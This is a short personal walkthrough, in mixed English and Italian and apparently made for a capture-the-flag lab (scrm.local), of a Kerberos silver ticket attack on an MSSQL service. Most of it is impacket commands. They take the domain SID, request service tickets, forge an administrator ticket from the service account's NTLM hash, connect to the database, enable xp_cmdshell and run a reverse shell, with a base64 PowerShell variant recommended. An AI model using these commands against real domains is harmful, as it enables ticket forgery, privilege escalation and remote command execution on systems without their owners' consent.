### **SILVER TICKET ATTACK**
To perform the silver ticket attack against the SQL service we need three things: 	
1. The NTLM hash of the password of the SqlSvc account. (TGT?)
2. The domain SID. 
```basH
impacket-getPac -targetUser <USER> <DOMAIN>/<USER>:<PASS>
```
3. The SPN that the SqlSvc account is using.
```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -k -dc-ip dc1.scrm.local -no-pass -request
```

Possiamo quindi ora ottenere il silver ticket
```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -nthash <sqlsvc NTLM hash> -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local administrator
```
![[Pasted image 20230621120729.png]]
exporta il ticket
```bash
export KRB5CCNAME=/tmp/administrator.ccache
```
se funziona tutto con klist dovresti vedere ciò
![[Pasted image 20230621121052.png]]
connettiti con 
```bash
impacket-mssqlclient -k <macchina>
```
### **RCE**
```bash
enable_xp_cmdshell;
```

```bash
xp_cmdshell <REV SHELL>
```
consiglio la powershell #3 (base64)
